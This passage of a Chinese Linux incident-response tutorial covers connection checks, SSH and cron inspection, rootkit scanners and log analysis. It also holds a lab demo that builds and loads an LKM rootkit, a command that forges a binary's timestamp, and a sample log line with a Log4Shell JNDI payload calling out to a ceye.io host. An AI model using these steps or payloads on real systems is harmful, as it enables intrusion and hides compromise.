查看所有网卡</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:23:3d:42 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.111.133/24 brd 192.168.111.255 scope global dynamic ens33</span><br><span class="line">       valid_lft 941sec preferred_lft 941sec</span><br><span class="line">    inet6 fe80::20c:29ff:fe23:3d42/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default </span><br><span class="line">    link/ether 02:42:76:f7:a7:4b brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">4: br-d9f18b6d603d: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span><br><span class="line">    link/ether 02:42:8b:93:c0:83 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-d9f18b6d603d</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::42:8bff:fe93:c083/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">10: veth6a9efeb@if9: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-d9f18b6d603d state UP group default </span><br><span class="line">    link/ether 76:0d:b7:6b:56:10 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet6 fe80::740d:b7ff:fe6b:5610/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vulab@sechelper:~$ sudo iftop -i ens33 -P # 指定ens33网卡，分析其流量</span><br></pre></td></tr></table></figure>
+<p><img src="https://static.sechelper.com/img/2022/12/06/e461969b8759256c669193911b549b55.png" alt="Snipaste_2022-12-06_10-21-21"></p>
+<center>图3 iftop流量分析 </center>
+<p><strong>网络连接</strong><br>
+服务器每发出和接收一个TCP/UDP请求都能看到连接（短时间内）。</p>
+<p>netstat 命令：</p>
+<ul>
+<li>-a 显示所有</li>
+<li>-n 数字形式展示连接端口</li>
+<li>-t  仅查看TCP连接情况</li>
+<li>-u  仅查看UDP连接情况</li>
+<li>-p 显示相关程序名</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">vulab@sechelper:~$ sudo netstat -antup # 我经常使用的一条命令，查看所有连接</span><br><span class="line">roto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 127.0.0.1:60801         0.0.0.0:*               LISTEN      1212/apache2        </span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      1066/mysqld         </span><br><span class="line">tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      1/init              </span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1502/nginx: master  </span><br><span class="line">tcp        0      0 10.0.4.16:53            0.0.0.0:*               LISTEN      771/named     </span><br><span class="line">tcp        0      0 10.0.4.16:80            93.157.63.28:10959      SYN_RECV    -                   </span><br><span class="line">tcp        0      0 10.0.4.16:35322         169.254.0.55:5574       ESTABLISHED 1316/YDService      </span><br><span class="line">tcp        0      0 10.0.4.16:41805         192.112.36.4:53         TIME_WAIT   -                   </span><br><span class="line">tcp        0      0 10.0.4.16:35978         169.254.0.138:8186      ESTABLISHED 58593/tat_agent     </span><br><span class="line">tcp6       0      0 127.0.0.1:60800         :::*                    LISTEN      1580/java           </span><br><span class="line">tcp6       0      0 :::111                  :::*                    LISTEN      1/init      </span><br><span class="line">... </span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>状态</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>LISTEN</td>
+<td>监听TCP端口，等待远程连接</td>
+</tr>
+<tr>
+<td>TIME-WAIT</td>
+<td>等待一段时间确保远程TCP中断请求</td>
+</tr>
+<tr>
+<td>ESTABLISHED</td>
+<td>打开着的连接</td>
+</tr>
+<tr>
+<td>SYN_RECV</td>
+<td>接收和发送连接请求后等待确认连接请求确认的情况。</td>
+</tr>
+<tr>
+<td>CLOSING</td>
+<td>等待远程TCP对连接中断的确认</td>
+</tr>
+<tr>
+<td>CLOSE</td>
+<td>连接完全关闭</td>
+</tr>
+</tbody>
+</table>
+<center>表2 端口状态对照表</center>
+<p><strong>关闭进程</strong></p>
+<p>这里注意一下，关停服务后进程是否会”复活“，如果恶意进程被<code>kill</code>后重新启动，那么肯定有其它地方有自启动方法，继续排查守护进程、定时任务、系统配置、服务和系统文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vulab@sechelper:~$ sudo kill -9 1434</span><br></pre></td></tr></table></figure>
+<h2 id="威胁情报"><a class="header-anchor" href="#威胁情报">¶</a>威胁情报</h2>
+<iframe src="//player.bilibili.com/player.html?aid=602345518&cid=812414069&bvid=BV1LB4y157VT" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"  width="700px" height="472px"> </iframe>
+<p>威胁情报是识别和分析网络威胁的过程。威胁情报平台可以查出一些域名和IP地址得<code>信誉</code>度，一旦发现它们存在网络攻击痕迹迅速封禁。</p>
+<ul>
+<li>
+<p><a target="_blank" rel="noopener" href="https://x.threatbook.com/">微步在线</a></p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/upload">VirusTotal</a></p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="https://ti.dbappsecurity.com.cn/">安恒威胁分析平台</a></p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="https://ti.sangfor.com.cn/analysis-platform">深信服威胁情报中心</a></p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="https://www.venuseye.com.cn/">VenusEye威胁情报中心</a></p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="https://ti.360.cn/#/homepage">360威胁情报中心</a></p>
+</li>
+<li>
+<p><a target="_blank" rel="noopener" href="https://www.threatminer.org/">Data Mining for Threat Intelligence</a></p>
+</li>
+</ul>
+<h2 id="SSH"><a class="header-anchor" href="#SSH">¶</a>SSH</h2>
+<p>SSH(Secure Shell)是一种加密的<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE">网络传输协议</a>，通常利用SSH来传输<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%95%8C%E9%9D%A2">命令行界面</a>和远程执行命令。</p>
+<p><strong>账户密码</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vulab@sechelper:~$ users</span><br><span class="line">vulab</span><br><span class="line">vulab@sechelper:~$ cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">...</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false</span><br><span class="line">vulab:x:1000:1000::/home/vulab:/bin/bash</span><br></pre></td></tr></table></figure>
+<ul>
+<li>/bin/bash</li>
+</ul>
+<p>账户可登录，登录后使用<code>/bin/bash</code>解释执行脚本</p>
+<ul>
+<li>/bin/false</li>
+</ul>
+<p>不可登录，不会有任何提示。</p>
+<ul>
+<li>/usr/sbin/nologin</li>
+</ul>
+<p>不可登录，拒绝用户登录。</p>
+<p><strong>密钥篡改</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vulab@sechelper:~$ cat authorized_keys </span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH9DeY9Ry/8FSlIEKEU/HH2yaPklCf36/ePIW9oS/9i7QklEqvvrPEfhpcSH0by98a+AjktEoUqt3TRLvM4IHtr7/KAP0m8cFyN0wlpvmY2rqwko3kPbaVm4sb8Qxc4IJo/0HjRvTAzNvTzzT7unWLaPZ8vUyrDVooRJWdjwbxpq0wtBvcNci7//145sTocddJDvsnwT7ulE/QIdBWHQdtclUr5zqToSZvslFZHOvoPx34+65R48CrBaucvdBPPslno6FFecQmc0Cy5CSVMr6VM67YdJp/E7RGTyl5M8KlCwXHjEabA9dUaT9oMyoR1Jb1u2m1lZWjAx1PTZ86+22XtskCizG3+hZIdwsSvGwArAhBymnkAsNZso3zqHymbnsnJpZ22FCUs/Gb4YiDjFahC61WsAmfiag6eJwLApfe086QVAcVfSLZQ82ppFRZV79PM+wu2VU0sb1zmj5F97MaF7LbZB4+QPoL9mnpOcRY6Unbs+TFyp7Pp4W8+/HbI5U=</span><br></pre></td></tr></table></figure>
+<p><strong>重装覆盖</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vulab@sechelper:~$ ls -lt /usr/bin/ssh /usr/sbin/sshd # 不可靠，时间可以被篡改</span><br><span class="line">-rwxr-xr-x 1 root root 876328 Dec  2  2021 /usr/sbin/sshd</span><br><span class="line">-rwxr-xr-x 1 root root 789448 Dec 18  2015 /usr/bin/ssh</span><br><span class="line"></span><br><span class="line">vulab@sechelper:~$ sudo touch -a -m -t 201512180130.09 /usr/bin/ssh # 篡改ssh创建时间</span><br><span class="line"></span><br><span class="line">vulab@sechelper:~$ ssh -V</span><br><span class="line">OpenSSH_8.2p1 Ubuntu-4ubuntu0.4, OpenSSL 1.1.1f  31 Mar 2020</span><br></pre></td></tr></table></figure>
+<p>参考：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/Psmths/openssh-backdoor">openssh-backdoor</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/diantong/p/11452631.html">ssh服务是如何劫持密码</a></li>
+</ul>
+<h2 id="定时任务"><a class="header-anchor" href="#定时任务">¶</a>定时任务</h2>
+<iframe src="//player.bilibili.com/player.html?aid=557432593&cid=814421630&bvid=BV1ne4y1Z7T9" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"  width="700px" height="472px"> </iframe>
+<p>定时定点执行Linux程序或脚本。</p>
+<p><strong>crontab</strong></p>
+<p>定时任务计划命令，下面几个是创建任务后保存的路径。</p>
+<ul>
+<li>/var/spool/cron/ 目录里的任务以用户命名</li>
+<li>/etc/crontab 调度管理维护任务</li>
+<li>/etc/cron.d/ 这个目录用来存放任何要执行的crontab文件或脚本。</li>
+<li>下面这些都是检查重点对象
+<ul>
+<li>/etc/cron.hourly/ 每小时执行一次</li>
+<li>/etc/cron.daily/ 每天执行一次</li>
+<li>/etc/cron.weekly/ 每周执行一次</li>
+<li>/etc/cron.monthly/ 每月执行一次</li>
+</ul>
+</li>
+</ul>
+<p><em>扩展知识：</em></p>
+<p><code>/etc/cron.allow </code>存放可创建定时任务账户，一行一个账户名，已创建的定时任务不受影响</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vulab@sechelper:~$sudo cat /etc/cron.allow</span><br><span class="line">root</span><br><span class="line">vulab@sechelper:~$ crontab -e</span><br><span class="line">You (vulab) are not allowed to use this program (crontab)</span><br><span class="line">See crontab(1) for more information</span><br></pre></td></tr></table></figure>
+<p><code>/etc/cron.deny </code> 存放不可创建定时任务账户，一行一个账户名，已创建的定时任务不受影响</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vulab@sechelper:~$ crontab -e</span><br><span class="line">You (vulab) are not allowed to use this program (crontab)</span><br><span class="line">See crontab(1) for more information</span><br></pre></td></tr></table></figure>
+<p>参考：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html">定时任务</a></li>
+</ul>
+<h1>Rootkit</h1>
+<iframe src="//player.bilibili.com/player.html?aid=514880890&cid=815501462&bvid=BV1ug411D74D" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"  width="700px" height="472px"> </iframe>
+<p>Rootkit是指其主要功能为：隐藏其他程序进程的软件，可能是一个或一个以上的软件组合。在今天，Rootkit一词更多地是指被作为驱动程序，加载到操作系统内核中的恶意软件。</p>
+<p><img src="https://static.sechelper.com/img/2022/12/06/cd517fdfe7a0ef7ef7fd9d821054c0c0.png" alt="rootkit"></p>
+<center>图4  rootkit原理图</center>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">vulab@sechelper:~/1337kit$ sudo python3 builder.py --config config.yml  <span class="comment"># 编译rootkit</span></span><br><span class="line">[sudo] password <span class="keyword">for</span> vulab: </span><br><span class="line"></span><br><span class="line"> ████   ████████   ████████  ██████████ █████       ███   █████</span><br><span class="line">░░███  ███░░░░███ ███░░░░███░███░░░░███░░███       ░░░   ░░███</span><br><span class="line"> ░███ ░░░    ░███░░░    ░███░░░    ███  ░███ █████ ████  ███████</span><br><span class="line"> ░███    ██████░    ██████░       ███   ░███░░███ ░░███ ░░░███░</span><br><span class="line"> ░███   ░░░░░░███  ░░░░░░███     ███    ░██████░   ░███   ░███</span><br><span class="line"> ░███  ███   ░███ ███   ░███    ███     ░███░░███  ░███   ░███ ███</span><br><span class="line"> █████░░████████ ░░████████    ███      ████ █████ █████  ░░█████</span><br><span class="line">░░░░░  ░░░░░░░░   ░░░░░░░░    ░░░      ░░░░ ░░░░░ ░░░░░    ░░░░░</span><br><span class="line">LKM Rootkit Builder</span><br><span class="line">...</span><br><span class="line">  LD [M]  /tmp/ItclNzX3O3hJUXQ3/project.ko</span><br><span class="line">make[1]: Leaving directory <span class="string">&#x27;/usr/src/linux-headers-5.4.0-109-generic&#x27;</span></span><br><span class="line"></span><br><span class="line">=== File /home/vulab/1337kit/project.ko created ===</span><br><span class="line"></span><br><span class="line">vulab@sechelper:~/1337kit$ sudo insmod project.ko <span class="comment"># 将rootkit安装到内核</span></span><br><span class="line">vulab@sechelper:~/1337kit$ sudo lsmod <span class="comment"># 查看内核模块</span></span><br><span class="line">vulab@sechelper:~/1337kit$ sudo rmmod project <span class="comment"># 卸载内核模块</span></span><br></pre></td></tr></table></figure>
+<p><strong>检查系统是否被植入rootkit</strong></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">vulab@sechelper:~$ sudo apt install chkrootkit # 安装chkrootkit</span><br><span class="line">vulab@sechelper:~$ sudo chkrootkit</span><br><span class="line">[sudo] password for vulab: </span><br><span class="line">ROOTDIR is `/&#x27;</span><br><span class="line">Checking `amd&#x27;...                                           not found</span><br><span class="line">Checking `basename&#x27;...                                      not infected</span><br><span class="line">Checking `biff&#x27;...                                          not found</span><br><span class="line">Checking `chfn&#x27;...                                          not infected</span><br><span class="line">Checking `chsh&#x27;...                                          not infected</span><br><span class="line">Checking `cron&#x27;...                                          not infected</span><br><span class="line">...</span><br><span class="line">Searching for suspect PHP files...                          nothing found</span><br><span class="line">Searching for anomalies in shell history files...           nothing found</span><br><span class="line">Checking `asp&#x27;...                                           not infected</span><br><span class="line">Checking `bindshell&#x27;...                                     not infected</span><br><span class="line">Checking `lkm&#x27;...                                           chkproc: nothing detected</span><br><span class="line">chkdirs: nothing detected</span><br><span class="line">Checking `rexedcs&#x27;...                                       not found</span><br><span class="line">Checking `sniffer&#x27;...                                       lo: not promisc and no packet ...</span><br><span class="line">Checking `w55808&#x27;...                                        not infected</span><br><span class="line">Checking `wted&#x27;...                                          chkwtmp: nothing deleted</span><br><span class="line">Checking `scalper&#x27;...                                       not infected</span><br><span class="line">Checking `slapper&#x27;...                                       not infected</span><br><span class="line">Checking `z2&#x27;...                                            chklastlog: nothing deleted</span><br><span class="line">Checking `chkutmp&#x27;...                                       chkutmp: nothing deleted</span><br><span class="line">Checking `OSX_RSPLUG&#x27;...                                    not tested</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install rkhunter # 安装rkhunter</span><br></pre></td></tr></table></figure>
+<p><img src="https://static.sechelper.com/img/2022/12/06/5190c5de652348cfcdd6c78c9aeae824.png" alt="rkhunter"></p>
+<center>图5  rhkhunter 配置</center>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">vulab@sechelper:~$ sudo rkhunter --check</span><br><span class="line">[ Rootkit Hunter version 1.4.6 ]</span><br><span class="line"></span><br><span class="line">Checking system commands...</span><br><span class="line"></span><br><span class="line">  Performing &#x27;strings&#x27; command checks</span><br><span class="line">    Checking &#x27;strings&#x27; command                               [ OK ]</span><br><span class="line"></span><br><span class="line">  Performing &#x27;shared libraries&#x27; checks</span><br><span class="line">    Checking for preloading variables                        [ None found ]</span><br><span class="line">    Checking for preloaded libraries                         [ None found ]</span><br><span class="line">    Checking LD_LIBRARY_PATH variable                        [ Not found ]</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p><strong>隐藏的rootkit如何删除</strong></p>
+<p>Rootkit在内核模块里找不到，那么就存在删除不掉的可能，这时候需要将感染系统以文件挂载到其它Linux系统上，进行清除操作。</p>
+<p>参考：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://rkhunter.sourceforge.net/">rkhunter 官网</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.chkrootkit.org/">chkrootkit 官网</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/lukasbalazik123/1337kit">rootkit demo</a></li>
+</ul>
+<h2 id="Linux系统日志排查"><a class="header-anchor" href="#Linux系统日志排查">¶</a>Linux系统日志排查</h2>
+<p>日志文件是记录l系统运行信息的文件，Linux系统内记载很多不同类型的日志，例如：</p>
+<ul>
+<li>Linux内核消息</li>
+<li>登入事件</li>
+<li>程序错误日志</li>
+<li>软件安装信息</li>
+</ul>
+<p>以上日志内记录系统内一些关键的信息，通过这些日志内记录的信息，可以帮助安全人员寻找到攻击者蛛丝马迹。作者整理了以下常见日志信息：</p>
+<p><code>/var/log/dmesg</code> 内核的一些信息。</p>
+<p><code>/var/log/auth.log</code> 此文件中包含系统授权信息，以及用户登录和使用的身份验证机制。</p>
+<p><code>/var/log/boot.log</code> 包含系统启动时记录的信息</p>
+<p><code>/var/log/daemon.log</code> 正在运行的各种系统后台守护程序将信息记录到此文件中。</p>
+<p><code>/var/log/kern.log</code> 包含内核记录的信息。有助于解决定制内核的故障。</p>
+<p><code>/var/log/lastlog</code> 显示所有用户的最近登录信息。这不是<code>ascii</code>文件。管理员可以使用<code>lastlog</code>命令查看此文件的内容。</p>
+<p><code>/var/log/maillog</code>和<code>/var/log/mail.log</code> 记录系统上运行的邮件服务器的信息。例如，<code>sendmail</code>将有关所有已发送项目的信息记录到此文件中。</p>
+<p><code>/var/log/user.log</code> 包含有关所有用户级日志的信息。</p>
+<p><code>/var/log/Xorg.x.log</code> 将来自x服务器的消息记录到此文件。</p>
+<p><code>/var/log/btmp</code> 此文件包含有关失败登录尝试的信息。使用最后一个命令查看btmp文件。例如，last-f/var/log/btmp|more。</p>
+<p><code>/var/log/yum.log</code> 包含使用yum安装包时记录的信息。在删除具有依赖项的包时，可以引用此文件。</p>
+<p><code>/var/log/cron</code> 每当cron守护程序（或anacron）启动cron作业时，它都会将有关cron作业的信息记录在该文件中</p>
+<p><code>/var/log/secure</code> 包含与身份验证和授权权限相关的信息。例如，sshd在这里记录所有消息，包括登录失败。</p>
+<p><code>/var/log/wtmp-wtmp</code> 文件记录所有登录和注销。</p>
+<p><code>/var/log/utmp-utmp</code> 文件允许您发现有关当前使用系统的用户的信息。</p>
+<p><code>/var/log/faillog</code> 包含失败的用户登录尝试。使用faillog命令显示此文件的内容。</p>
+<p><code>/var/log/httpd/</code> 包含apacheweb服务器access_log和error_log以及相关的虚拟主机日志（如果设置为在此处记录）。</p>
+<p><code>/var/log/apache2</code> 包含apache web服务器access_log和error_log以及相关的虚拟主机日志（如果设置为在此处记录）。</p>
+<p><code>/var/log/conman/-conman</code> 客户端的日志文件。conman连接由conmand守护进程管理的远程控制台。</p>
+<p><code>/var/log/mail/</code>  此子目录包含来自邮件服务器的其他日志。例如，sendmail将收集的邮件统计信息存储在/var/log/mail/statistics文件中</p>
+<p><code>/var/log/audit/</code>  包含由Linux审核守护程序（auditd）存储的日志信息。</p>
+<p><code>/var/log/settroubleshoot/</code> SELinux使用settroublishootd（SE TroubleshootDaemon）来通知文件安全上下文中的问题，并将这些信息记录在此日志文件中。</p>
+<p><code>/var/log/samba/</code>  包含samba存储的日志信息，用于将Windows连接到Linux。</p>
+<p><code>/var/log/sa/</code>  包含sysstat包收集的每日sar文件。</p>
+<p>以上的每个文件都给大家演示一遍不太可能，这里重点是交给大家思路。如下案例：</p>
+<h3 id="登入验证日志"><a class="header-anchor" href="#登入验证日志">¶</a>登入验证日志</h3>
+<ol>
+<li>不知道日志的每一行是做什么的，去搜索</li>
+<li>既然是登入验证肯定会有成功和失败，那么什么状态是成功或失败</li>
+<li>除成功失败外是不是包含其它信息，如：用户名、登入来源IP地址</li>
+</ol>
+<p>经过以上的几点思考，我在网上找到文章和命令</p>
+<p><strong>登入失败次数</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vulab@sechelper:/var/log$ sudo grep <span class="string">&quot;Failed password&quot;</span> auth.log | <span class="built_in">wc</span> -l</span><br></pre></td></tr></table></figure>
+<p><strong>登入成功</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vulab@sechelper:/var/log$ sudo grep <span class="string">&quot;password&quot;</span> auth.log | grep -v Failed | grep -v Invalid</span><br></pre></td></tr></table></figure>
+<p><strong>统计攻击者IP个数</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vulab@sechelper:/var/log$ sudo awk &#x27;&#123;if($6==&quot;Failed&quot;&amp;&amp;$7==&quot;password&quot;)&#123;if($9==&quot;invalid&quot;)&#123;ips[$13]++;users[$11]++&#125;else&#123;users[$9]++;ips[$11]++&#125;&#125;&#125;END&#123;for(ip in ips)&#123;print ip, ips[ip]&#125;&#125;&#x27; auth.* | wc -l</span><br></pre></td></tr></table></figure>
+<p><strong>攻击次数排列，由高到低</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">vulab@sechelper:/var/log$ sudo awk <span class="string">&#x27;&#123;if($6==&quot;Failed&quot;&amp;&amp;$7==&quot;password&quot;)&#123;if($9==&quot;invalid&quot;)&#123;ips[$13]++;users[$11]++&#125;else&#123;users[$9]++;ips[$11]++&#125;&#125;&#125;END&#123;for(ip in ips)&#123;print ip, ips[ip]&#125;&#125;&#x27;</span> auth.* | <span class="built_in">sort</span> -k2 -rn | <span class="built_in">head</span></span><br><span class="line">41.214.134.201 18358</span><br><span class="line">189.217.194.155 9994</span><br><span class="line">218.39.177.111 4713</span><br><span class="line">120.48.13.143 2179</span><br><span class="line">36.138.66.177 1448</span><br><span class="line">139.162.114.41 861</span><br><span class="line">104.248.94.181 756</span><br><span class="line">188.166.57.168 431</span><br><span class="line">141.94.110.90 347</span><br><span class="line">23.224.143.15 307</span><br></pre></td></tr></table></figure>
+<h3 id="参考"><a class="header-anchor" href="#参考">¶</a>参考</h3>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.loggly.com/ultimate-guide/linux-logging-basics/">https://www.loggly.com/ultimate-guide/linux-logging-basics/</a></li>
+<li><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000021752790">查找  ssh 暴力攻击：使用 awk、grep 等命令简单分析服务器</a></li>
+</ul>
+<h2 id="中间件日志"><a class="header-anchor" href="#中间件日志">¶</a>中间件日志</h2>
+<p>中间件是介于应用系统和系统软件之间的一类软件，它使用系统软件所提供的基础服务（功能），衔接网络上应用系统的各个部分或不同的应用，能够达到资源共享、功能共享的目的。</p>
+<p><strong>nginx</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">220.181.108.159 - - [01/Dec/2022:15:10:15 +0800] &quot;GET / HTTP/1.1&quot; 403 134 &quot;-&quot; &quot;Mozilla/5.0 (Linux;u;Android 4.2.2;zh-cn;) AppleWebKit/534.46 (KHTML,like Gecko) Version/5.1 Mobile Safari/10600.6.3 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)&quot;</span><br></pre></td></tr></table></figure>
+<p><strong>apache</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.111.1 - - [01/Dec/2022:07:20:05 +0000] &quot;GET /admin.php HTTP/1.1&quot; 404 491 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0&quot;</span><br></pre></td></tr></table></figure>
+<p><strong>tomcat</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.111.1 - - [01/Dec/2022:08:28:25 +0000] &quot;GET /admin.jsp$%7Bjndi:ldap://2lnhn2.ceye.io%7D HTTP/1.1&quot; 404 767</span><br></pre></td></tr></table></figure>
+<p><strong>分析维度：</strong></p>
+<ul>
+<li>时间范围内IP访问量</li>
+<li>时间范围内对某个页面的IP访问量</li>
+<li>时间范围内IP访问错误数</li>
+<li>关键字搜索</li>
+</ul>
+<h3 id="参考："><a class="header-anchor" href="#参考：">¶</a>参考：</h3>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1051427">运维必备技能 WEB 日志分析</a></li>
+</ul>
+<h2 id="严重声明"><a class="header-anchor" href="#严重声明">¶</a>严重声明</h2>
+<p>文中技术只可用于安全技术研究，任何非法用途与作者无关，请勿用在生产环境安装测试rootkit。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
